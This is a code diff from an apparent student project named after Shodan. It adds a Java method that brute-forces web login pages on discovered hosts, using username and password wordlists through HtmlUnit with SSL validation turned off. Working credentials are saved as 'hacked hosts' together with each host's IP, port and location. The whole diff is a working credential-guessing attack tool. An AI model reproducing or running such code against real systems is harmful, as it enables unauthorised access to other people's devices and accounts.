@@ -26,6 +26,14 @@ import org.springframework.scheduling.annotation.Async;
 import org.springframework.scheduling.annotation.AsyncResult;
 import org.springframework.stereotype.Service;
 
+import com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;
+import com.gargoylesoftware.htmlunit.WebClient;
+import com.gargoylesoftware.htmlunit.html.HtmlButton;
+import com.gargoylesoftware.htmlunit.html.HtmlForm;
+import com.gargoylesoftware.htmlunit.html.HtmlPage;
+import com.gargoylesoftware.htmlunit.html.HtmlPasswordInput;
+import com.gargoylesoftware.htmlunit.html.HtmlSubmitInput;
+import com.gargoylesoftware.htmlunit.html.HtmlTextInput;
 import com.uah.shodan_tfg.core.services.IConnectionService;
 import com.uah.shodan_tfg.core.util.IFileService;
 import com.uah.shodan_tfg.dataproviders.dao.HackedHost;
@@ -93,6 +101,130 @@ public class ConnectionService implements IConnectionService {
 			LOGGER.error(e.getMessage(), e);
 		}
 		return body;
+	}
+
+	@Override
+	@Async
+	public Future<String> webAuthLogin(Host host, List<String> wordlists)
+			throws InterruptedException {
+		String result = "";
+		finalResult = "";
+		List<String> userWordlist = fileService
+				.fileToList("wordlists/" + wordlists.get(0));
+		List<String> passWordlist = fileService
+				.fileToList("wordlists/" + wordlists.get(1));
+		String ip = host.getIp();
+		Integer port = host.getPort();
+
+		if (running.compareAndSet(false, true)) {
+			final WebClient webClient = new WebClient();
+			String protocol = "http://";
+			if (host.getPort() == 443) {
+				protocol = "https://";
+			}
+			webClient.getOptions().setUseInsecureSSL(true);
+			HtmlPage page;
+
+			try {
+
+				for (String user : userWordlist) {
+					for (String pass : passWordlist) {
+						if (Thread.currentThread().isInterrupted()) {
+							System.out.println("Interrupted");
+							running.set(false);
+							return new AsyncResult<String>(finalResult);
+						}
+
+						page = webClient.getPage(
+								protocol + host.getIp() + ":" + host.getPort());
+
+						final HtmlForm form = page.getForms().get(0);
+
+						final HtmlTextInput userField = (HtmlTextInput) form
+								.getByXPath(
+										"//input[contains(@name, 'user') or contains(@name, 'username') or contains(@name, 'userName') or contains(@name, 'login') or contains(@ng-model, 'user')]")
+								.get(0);
+						final HtmlPasswordInput passField = (HtmlPasswordInput) form
+								.getByXPath(
+										"//input[contains(@type, 'password')]")
+								.get(0);
+
+						System.out.println("Credentials tested --> User: "
+								+ user + " | Password: " + pass);
+						messageController.send("Credentials tested --> User: "
+								+ user + " | Password: " + pass);
+
+						userField.type(user);
+						passField.type(pass);
+
+						final HtmlSubmitInput button;
+						final HtmlButton backupButton;
+						HtmlPage page2;
+						try {
+							button = (HtmlSubmitInput) form
+									.getByXPath(
+											"//*[contains(@type, 'submit')]")
+									.get(0);
+							page2 = button.click();
+						} catch (Exception ex) {
+							backupButton = (HtmlButton) form.getByXPath(
+									"//button[contains(@type, 'submit') or contains(@id, 'submit')]")
+									.get(0);
+							page2 = backupButton.click();
+						}
+						// Now submit the form by clicking the button and get
+						// back the second page.
+
+						// Get new form, if exists
+						if (page2.getForms().isEmpty() || page2.getForms()
+								.get(0)
+								.getByXPath(
+										"//input[contains(@type, 'password')]")
+								.isEmpty()) {
+							result = "Correct login credentials --> User: "
+									+ user + " | Password: " + pass;
+							System.out.println(result);
+							messageController.send(result);
+							finalResult = ip + "|" + user + "|" + pass + "|"
+									+ port;
+							HackedHost hackedHost = hackedHostRepository
+									.findByIpAndPort(ip, host.getPort());
+							if (hackedHost == null) {
+								hackedHost = new HackedHost(null, ip, user,
+										pass, host.getPort(),
+										host.getLocation().getCountry(),
+										host.getLocation().getCity(),
+										finalResult);
+							} else {
+								hackedHost.setUser(user);
+								hackedHost.setPassword(pass);
+							}
+							hackedHostRepository.save(hackedHost);
+							running.set(false);
+							return new AsyncResult<String>(finalResult);
+						} else {
+							System.out.println("Incorrect login credentials");
+							messageController
+									.send("Incorrect login credentials");
+						}
+					}
+				}
+			} catch (FailingHttpStatusCodeException | IOException e) {
+				LOGGER.error(e.getMessage(), e);
+			} catch (Exception e) {
+				LOGGER.error(e.getMessage(), e);
+				messageController.send("Login attempts for IP " + ip
+						+ " failed: webpage is not a login site");
+				running.set(false);
+				return new AsyncResult<String>(finalResult);
+			}
+		}
+		System.out.println(
+				"Login attempts for IP " + ip + " were not successfull");
+		messageController
+				.send("Login attempts for IP " + ip + " were not successfull");
+		return new AsyncResult<String>(finalResult);
+
 	}
 
 	private void testSecurity(Integer id, String ip, Integer port) {
